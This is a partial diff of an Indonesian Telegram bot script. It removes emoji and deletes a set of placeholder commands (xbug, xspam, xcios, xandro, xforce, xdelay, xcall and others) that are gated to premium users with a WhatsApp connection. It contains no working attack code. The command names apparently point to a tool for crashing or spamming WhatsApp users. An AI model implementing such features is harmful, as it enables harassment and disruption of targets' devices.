+                await ctx.reply(`Script masih versi terbaru!\nTidak ada update tersedia.`);
             }
         } catch (error) {
-            console.error(chalk.red("Gagal cek versi:", error.message));
-            await ctx.reply(`❌ Gagal mengecek versi: ${error.message}`);
+            console.error(chalk.red("Gagal cek update:", error.message));
+            await ctx.reply(`Gagal mengecek update: ${error.message}`);
         }
     }
 });
 
-// ======================= COMMAND KOSONG (TEMPAT LOGIKA NANTI) =======================
-bot.command("setcd", checkOwner, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("addbot", checkOwner, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("dellbot", checkOwner, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("listbot", checkOwner, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xbug", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xspam", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xcios", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xandro", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xforce", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xperma", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xdelay", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("Adelay", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("xcall", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-bot.command("hapusbug", checkWA, checkPremium, async (ctx) => { await ctx.reply("⏳ Fitur sedang dalam pengembangan"); });
-
 // ======================= ERROR HANDLER =======================
 bot.catch((err, ctx) => {
     console.error(chalk.red(`Error untuk ${ctx.updateType}:`, err.message));
-    ctx.reply("❌ Terjadi kesalahan, coba lagi nanti.").catch(() => {});
+    ctx.reply("Terjadi kesalahan, coba lagi nanti.").catch(() => {});
 });
 
 // ======================= START BOT =======================
 async function startBot() {
-    console.log(chalk.blue(`⠀⠀⠀
+    console.log(chalk.blue(`
 ╭╮╱╭┳━━━┳╮╱╱╭╮╭╮╭━━━┳╮╱╭┳━━━╮
 ┃┃╱┃┃╭━╮┃┃╱╱┃┃┃┃┃╭━╮┃┃╱┃┃╭━╮┃
 ┃┃╱┃┃╰━╯┃┃╱╱┃┃┃┃┃╰━╯┃┃╱┃┃╰━━╮
@@ -1191,7 +1101,7 @@ Bot Berhasil Terhubung`));
     bot.launch();
     startAutoTokenRefresh();
 
-    console.log(chalk.green("✅ Bot Telegram berjalan..."));
+    console.log(chalk.green("Bot Telegram berjalan..."));
 }
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
